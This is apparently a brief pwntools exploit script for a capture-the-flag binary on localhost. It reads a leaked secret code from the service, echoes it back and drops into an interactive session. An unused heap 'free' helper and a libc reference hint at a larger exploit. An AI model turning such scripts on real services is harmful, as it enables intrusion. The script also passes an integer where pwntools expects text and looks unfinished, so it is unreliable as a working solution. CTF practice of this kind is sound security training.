from pwn import *

p = remote("localhost", 8889)
# p = process("./app")
e = ELF("./app")
# libc = ELF("./libc6_2.27-3ubuntu1.4_amd64.so")

# gdb.attach(p)
def slog(symbol, addr): return success(symbol + ": " + hex(addr))

context.log_level = 'debug'

def free(idx):
    p.sendlineafter("> ", "2")
    p.sendlineafter(":", str(idx))

p.sendlineafter("> ", "ABC")
p.sendlineafter("> ", "1")

secret_code = int(p.recvline()[:-1],16)
slog("secret_code", secret_code)


p.sendlineafter("> ", secret_code)
p.recvline()

p.interactive()